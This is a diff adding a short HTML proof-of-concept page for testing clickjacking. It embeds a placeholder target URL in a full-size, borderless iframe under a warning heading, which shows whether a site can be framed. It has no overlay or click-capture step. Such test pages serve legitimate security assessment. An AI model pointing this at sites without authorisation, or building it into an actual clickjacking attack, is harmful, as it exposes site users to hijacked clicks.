@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ClickJacking PoC</title>
+  <style>
+    body {
+      padding: 20px;
+      font-family: Arial, sans-serif;
+    }
+    
+    h2 {
+      color: #ff0000;
+    }
+    
+    .iframe-container {
+      position: relative;
+      width: 100%;
+      height: 0;
+      padding-bottom: 56.25%; /* 16:9 aspect ratio for responsive iframe */
+    }
+    
+    .iframe-container iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <h2>Your Web Application Can be Vulnerable to Clickjacking!</h2>
+  <div class="iframe-container">
+    <iframe src="https://www.inserttargeturl.com" allow="autoplay"></iframe>
+  </div>
+</body>
+</html>
